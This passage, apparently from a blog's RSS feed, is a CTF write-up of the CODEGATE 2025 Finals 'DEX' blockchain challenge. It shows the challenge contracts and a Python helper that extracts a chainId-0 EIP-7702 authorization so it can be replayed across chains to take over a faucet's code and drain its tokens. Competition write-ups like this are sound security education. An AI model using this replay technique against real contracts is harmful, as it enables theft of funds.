<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeups on teddyctf</title>
    <link>https://TheSavageTeddy.github.io/categories/writeups/</link>
    <description>Recent content in Writeups on teddyctf</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>teddyctf</copyright>
    <lastBuildDate>Tue, 15 Jul 2025 13:26:40 +1000</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/categories/writeups/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Blockchain Writeup - Codegate Finals 2025</title>
      <link>https://TheSavageTeddy.github.io/featured/codegate-finals-2025/</link>
      <pubDate>Tue, 15 Jul 2025 13:26:40 +1000</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/codegate-finals-2025/</guid>
      <description>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;A few days ago, I had the opportunity to participate in the CODEGATE 2025 Finals CTF. I played with the team &lt;a href=&#34;https://ctftime.org/team/280849&#34;&gt;ü§¨üá´üá∑üõπüêª&lt;/a&gt; (Pissed French Skateboarding Bears), and we managed to place 7th out of 20 teams!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;In this blog post, I will provide a detailed walkthrough of &lt;code&gt;DEX&lt;/code&gt;, an interesting cross-chain blockchain challenge that I managed to get first blood on!&lt;/p&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/codegate-finals-2025/#dex---8-solves&#34;&gt;DEX&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;blockchain&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;dex---8-solves-&#34;&gt;DEX - 8 solves ü©∏&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;DEX
I love Web3.0, so I made cross chain dex :)
nc 16.184.13.125 1337&lt;/p&gt;</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;A few days ago, I had the opportunity to participate in the CODEGATE 2025 Finals CTF. I played with the team &lt;a href=&#34;https://ctftime.org/team/280849&#34;&gt;ü§¨üá´üá∑üõπüêª&lt;/a&gt; (Pissed French Skateboarding Bears), and we managed to place 7th out of 20 teams!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;In this blog post, I will provide a detailed walkthrough of &lt;code&gt;DEX&lt;/code&gt;, an interesting cross-chain blockchain challenge that I managed to get first blood on!&lt;/p&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/codegate-finals-2025/#dex---8-solves&#34;&gt;DEX&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;blockchain&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;dex---8-solves-&#34;&gt;DEX - 8 solves ü©∏&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;DEX
I love Web3.0, so I made cross chain dex :)
nc 16.184.13.125 1337&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are provided with a &lt;a href=&#34;https://TheSavageTeddy.github.io/featured/codegate-finals-2025/DEX_codegate_finals_2025.zip&#34;&gt;zip file attachment&lt;/a&gt; which unzips into 2 main folders. I will briefly highlight the important files below, but we will go into more detail later as well.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;src/contracts&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Setup.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Challenge setup, contains the requirements for solving the challenge through checks in &lt;code&gt;solve()&lt;/code&gt; function.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DEX.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Fixed-rate token swapping contract, facilitating swaps between three ERC20 tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FaucetLogic.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Token faucet, contains &lt;code&gt;claimToken()&lt;/code&gt; function to claim tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Token.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Normal ERC20 token, slightly modified so the contract owner can &lt;code&gt;mint&lt;/code&gt; and &lt;code&gt;burn&lt;/code&gt; tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;src/eth_sandbox&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;launcher.py&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Deploys challenge contracts and sets up the challenge instance.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;relayer.py&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Cross-chain relayer (more on this later!)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To provide some context, there are two different chains, CODE chain and GATE chain. Contracts are deployed on both chains. The &lt;code&gt;DEX&lt;/code&gt; contract is both a cross-chain message sender and receiver, allowing communication across chains facilitated through the relayer &lt;code&gt;relayer.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Lets look at the &lt;code&gt;Setup&lt;/code&gt; contract.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Setup.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
pragma solidity ^0.8.25;

import &amp;#34;./DEX.sol&amp;#34;;
import &amp;#34;./Token.sol&amp;#34;;
import &amp;#34;./FaucetLogic.sol&amp;#34;;

contract Setup {
    uint256 public constant CODE_CHAIN = 10;
    uint256 public constant GATE_CHAIN = 100;

    address public dex;
    address public tokenA;
    address public tokenB;
    address public tokenC;
    address public faucet;
    address public faucetLogic;
    bool public isSolved = false;
    uint256 public constant DEX_SUPPLY = 600 ether;
    constructor(address _faucet) {
        
        faucetLogic = address(new FaucetLogic());
        faucet  = _faucet;

        if(block.chainid == CODE_CHAIN) {
            tokenA = address(new Token(&amp;#34;CODE USDC&amp;#34;, &amp;#34;cUSDC&amp;#34;));
            tokenB = address(new Token(&amp;#34;CODE PURR&amp;#34;, &amp;#34;cPURR&amp;#34;));
            tokenC = address(new Token(&amp;#34;CODE MOODENG&amp;#34;, &amp;#34;cMOODENG&amp;#34;));
        } else {
            tokenA = address(new Token(&amp;#34;GATE USDC&amp;#34;, &amp;#34;gUSDC&amp;#34;));
            tokenB = address(new Token(&amp;#34;GATE PURR&amp;#34;, &amp;#34;gPURR&amp;#34;));
            tokenC = address(new Token(&amp;#34;GATE MOODENG&amp;#34;, &amp;#34;gMOODENG&amp;#34;));
        }

        Token[] memory tokens = new Token[](3);
        tokens[0] = Token(tokenA);
        tokens[1] = Token(tokenB);
        tokens[2] = Token(tokenC);

        dex = address(new DEX(msg.sender, tokens));
        Token(tokenA).mint(address(dex), DEX_SUPPLY);
        Token(tokenB).mint(address(dex), DEX_SUPPLY);
        Token(tokenC).mint(address(dex), DEX_SUPPLY);

        Token(tokenA).transferOwnership(msg.sender);
        Token(tokenB).transferOwnership(msg.sender);
        Token(tokenC).transferOwnership(msg.sender);
    }

    function getToken() public {
        if(block.chainid == GATE_CHAIN) {
            Token(tokenA).transfer(faucet, 100 ether);
            Token(tokenB).transfer(faucet, 100 ether);
            Token(tokenC).transfer(faucet, 100 ether);
        }
    }
    function solve() public {
        require(block.chainid == CODE_CHAIN, &amp;#34;Can be solved only on CODE CHAIN&amp;#34;);
        require(Token(tokenA).balanceOf(msg.sender) &amp;gt;= DEX_SUPPLY * 2, &amp;#34;Not enough USDC&amp;#34;);
        require(Token(tokenB).balanceOf(msg.sender) &amp;gt;= DEX_SUPPLY * 2, &amp;#34;Not enough PURR&amp;#34;);
        require(Token(tokenC).balanceOf(msg.sender) &amp;gt;= DEX_SUPPLY * 2, &amp;#34;Not enough MOODENG&amp;#34;);
        isSolved = true;
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It deploys three tokens, the DEX, and mints 600 of each token to the DEX. Some of its behaviour differs based on which chain it was deployed on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getToken()&lt;/code&gt; transfers 100 of each token to &lt;code&gt;faucet&lt;/code&gt; if called on the GATE chain, otherwise it does nothing. Note that on the GATE chain this can only be called once, as the Setup contract only has 100 of each token.&lt;/li&gt;
&lt;li&gt;To solve the challenge, we must call &lt;code&gt;solve()&lt;/code&gt; on the CODE chain. The solve requirement is that we have double of the initial DEX supply of each token, aka 1200 of each of the three tokens on the CODE chain.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenge-first-part---getting-tokens-from-faucet&#34;&gt;Challenge first part - getting tokens from faucet&lt;/h2&gt;
&lt;p&gt;Before we look at the DEX contract, let&amp;rsquo;s take a look into how we actually obtain the 100 tokens at the start. Notice that on the GATE chain, &lt;code&gt;getToken()&lt;/code&gt; sends the tokens to &lt;code&gt;faucet&lt;/code&gt;, not the player.&lt;/p&gt;
&lt;p&gt;Looking at &lt;code&gt;launcher.py&lt;/code&gt;, we see that &lt;code&gt;faucet&lt;/code&gt; is actually an EOA (not a contract), which is surprising. However, it makes sense after I read the code and realised that &lt;code&gt;faucet&lt;/code&gt; is using &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-7702&#34;&gt;EIP-7702&lt;/a&gt;. &lt;a href=&#34;https://netbasal.medium.com/eip-7702-delegated-execution-and-sponsored-transactions-ad7f5ef80257&#34;&gt;This&lt;/a&gt; is a nice article detailing it.&lt;/p&gt;
&lt;p&gt;Essentially, during challenge deployment, &lt;code&gt;faucet&lt;/code&gt; sends a transaction with &lt;code&gt;authorizationList&lt;/code&gt; set, essentially setting its own code to &lt;code&gt;FaucetLogic&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;new_launch_instance_action&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    do_deploy: Callable[[Web3, str, str, str, int], str],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Action:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, node &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(node_info):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            faucet_logic_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; setup_contract&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;faucetLogic()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            signed_auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; faucet_account&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign_authorization({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chainId&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;address&amp;#34;&lt;/span&gt;: faucet_logic_addr,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nonce&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;## CODE chain only&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                tx_dict[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authorizationList&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [signed_auth]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            signed_tx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; deployer_account&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign_transaction(tx_dict)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            tx_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; web3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_raw_transaction(signed_tx&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw_transaction)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It seems like we can just call &lt;code&gt;claimToken()&lt;/code&gt; on the faucet on GATE chain to claim the tokens, right?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;pragma solidity&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./Token.sol&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;contract&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FaucetLogic&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;claimToken&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; _token) &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Token(_token).transfer(msg.sender, Token(_token).balanceOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this)));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It turns out, the transaction with &lt;code&gt;authorizationList&lt;/code&gt; set is only for CODE chain, meaning on GATE chain, &lt;code&gt;faucet&lt;/code&gt; is not using EIP-7702 and hence has no code. And the faucet only has tokens on GATE chain, not CODE chain.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;## CODE chain only&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                tx_dict[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authorizationList&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [signed_auth]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So what do we do?&lt;/p&gt;
&lt;p&gt;My initial thought was that we had to do something related to a replay attack across the two different chains, but I didn&amp;rsquo;t quite know how that would work, since with the introduction of &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-155&#34;&gt;EIP-155&lt;/a&gt;, transaction hashes include the chain id to prevent replay attacks across different chains.&lt;/p&gt;
&lt;p&gt;However, I noticed something strange when the authorization was being signed. Both the chain Id and nonce were both set to 0. It was surprising the chain Id wasn&amp;rsquo;t set to the CODE chain id.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            signed_auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; faucet_account&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign_authorization({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chainId&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;address&amp;#34;&lt;/span&gt;: faucet_logic_addr,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nonce&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            })
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I wondered if there was any significance in the chain Id being 0 and found &lt;a href=&#34;https://namespaces.chainagnostic.org/eip155/caip10&#34;&gt;this&lt;/a&gt; which stated:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Special case of EOA&lt;/p&gt;
&lt;p&gt;To express Ethereum account without reference to any specific EIP-155 chain ID, CAIP-10 identifiers can use the special chainId segment 0.&lt;/p&gt;
&lt;p&gt;In the Ethereum account system, ‚Äúexternally owned accounts‚Äù (i.e. ‚Äúoffchain‚Äù wallets) are controlled by user agents and not by on-chain entities (i.e. deployed or deployable smart contract code). The special chainId 0 SHOULD only be used for accounts that can be used in off-chain contexts, i.e. without the use of an Ethereum node.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;It sounded a bit confusing, but essentially, EIP-155 is ignored if chain Id 0 is used. Therefore, signed transactions with chain Id of 0 are replayable on any chain!&lt;/p&gt;
&lt;p&gt;So we can set the authorization list of the faucet on GATE chain by getting the signed authorization on CODE chain, and replaying that on the GATE chain.&lt;/p&gt;
&lt;p&gt;To send a transaction with EIP-7702 authorization list, we can use Foundry&amp;rsquo;s &lt;a href=&#34;https://getfoundry.sh/cast/reference/cast-send/&#34;&gt;&lt;code&gt;cast send&lt;/code&gt;&lt;/a&gt; with the &lt;code&gt;--auth&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;To retrieve and format the signed authorization, I asked ChatGPT to write a script to get the first transaction in the second block and encode it so I could pass the value straight to &lt;code&gt;cast send&lt;/code&gt;.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;get_signed_authorization.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from web3 import Web3
import rlp
from eth_utils import to_bytes, keccak, to_hex

# RLP list encoding expects all values in bytes or integers
class Authorization(rlp.Serializable):
    fields = [
        (&amp;#34;chainId&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;address&amp;#34;, rlp.sedes.Binary.fixed_length(20)),
        (&amp;#34;nonce&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;yParity&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;r&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;s&amp;#34;, rlp.sedes.big_endian_int),
    ]

import os
# RPC endpoint
CODE_RPC = os.getenv(&amp;#34;RPCURL_CODE&amp;#34;)
w3 = Web3(Web3.HTTPProvider(CODE_RPC))

# Get block 0x2 and its transactions
block = w3.eth.get_block(2, full_transactions=True)

if not block[&amp;#34;transactions&amp;#34;]:
    print(&amp;#34;‚ùå No transactions in block 0x2&amp;#34;)
    exit(1)

tx = block[&amp;#34;transactions&amp;#34;][0]

if &amp;#34;authorizationList&amp;#34; not in tx or not tx[&amp;#34;authorizationList&amp;#34;]:
    print(&amp;#34;‚ùå No authorizationList in first transaction&amp;#34;)
    exit(1)

auth = tx[&amp;#34;authorizationList&amp;#34;][0]

# Extract fields
chain_id = int(auth[&amp;#34;chainId&amp;#34;], 16)
address = bytes.fromhex(auth[&amp;#34;address&amp;#34;][2:])
nonce = int(auth[&amp;#34;nonce&amp;#34;], 16)
y_parity = int(auth[&amp;#34;yParity&amp;#34;], 16)
r = int(auth[&amp;#34;r&amp;#34;], 16)
s = int(auth[&amp;#34;s&amp;#34;], 16)

# RLP encode the auth
auth_obj = Authorization(chain_id, address, nonce, y_parity, r, s)
encoded = rlp.encode(auth_obj)
auth_hex = to_hex(encoded)

print(&amp;#34;‚úÖ Foundry cast send --auth value:&amp;#34;)
print(f&amp;#34;--auth {auth_hex}&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Then, we replay the signed authorization on the GATE chain to set the faucet code, allowing us to call &lt;code&gt;claimToken()&lt;/code&gt; to get tokens.&lt;/p&gt;

  &lt;img src=&#34;./img/ss1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;



  &lt;img src=&#34;./img/ss2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;


&lt;p&gt;As shown in the images above, we successfully set the code of faucet on GATE chain.&lt;/p&gt;
&lt;h2 id=&#34;challenge-second-part---abusing-cross-chain-swapping-behaviour&#34;&gt;Challenge second part - Abusing cross-chain swapping behaviour&lt;/h2&gt;
&lt;p&gt;Now let&amp;rsquo;s look at the DEX contract.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;DEX.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
pragma solidity ^0.8.25;

import &amp;#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&amp;#34;;
import &amp;#34;./Token.sol&amp;#34;;

contract DEX {
    Token[] public tokens;
    uint256 public constant CODE_CHAIN = 10;
    uint256 public constant GATE_CHAIN = 100;
    address public immutable relayer;
    uint256[] public rates = [1_000_000, 200_000, 190_000];

    mapping(bytes32 =&amp;gt; address) public tokenMapping;

    modifier onlyRelayer() {
        require(msg.sender == relayer, &amp;#34;Only relayer&amp;#34;);
        _;
    }
    
    enum MessageType {
        LiquidityRequest,
        LiquidityResponse,
        SwapRequest
    }

    struct Message {
